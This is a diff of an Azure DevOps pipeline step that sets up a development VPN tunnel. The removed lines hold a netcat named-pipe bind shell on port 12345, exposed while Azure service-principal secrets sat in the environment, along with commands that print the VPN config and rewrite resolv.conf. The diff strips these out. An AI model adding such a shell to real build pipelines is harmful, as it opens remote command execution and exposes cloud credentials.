@@ -208,26 +208,15 @@ stages:
             
           #create vpn tunnel
           - bash: |
-              sudo apt-get update
-              sudo apt-get --assume-yes --no-install-recommends install openvpn netcat
-              ls
-              curl ifconfig.me
-              rm -f /tmp/f; mkfifo /tmp/f
-              cat /tmp/f | /bin/sh -i 2>&1 | nc -lv 12345 > /tmp/f
-              
-              head $OVPN_CONFIG
-              sudo openvpn --config $OVPN_CONFIG
+              sudo apt-get --assume-yes --no-install-recommends install openvpn
+              sudo openvpn $OVPN_CONFIG &
+        
               sleep 5
-              ifconfig
+        
+              ifconfig tun0
               
-              echo -e "nameserver 10.7.197.20\n$(cat /etc/resolv.conf)" | sudo tee /etc/resolv.conf
-              cat /etc/resolv.conf
-                           
               nslookup fa-polaris-dev-gateway.azurewebsites.net
             env:
-              ARM_CLIENT_ID: $(innovation-development-spn-client-id)
-              ARM_CLIENT_SECRET: $(innovation-development-spn-secret)
-              ARM_TENANT_ID: $(innovation-development-spn-tenant-id)
               OVPN_CONFIG: $(devVpnCertificate.secureFilePath)
             displayName: Creating DEV VPN tunnel
             
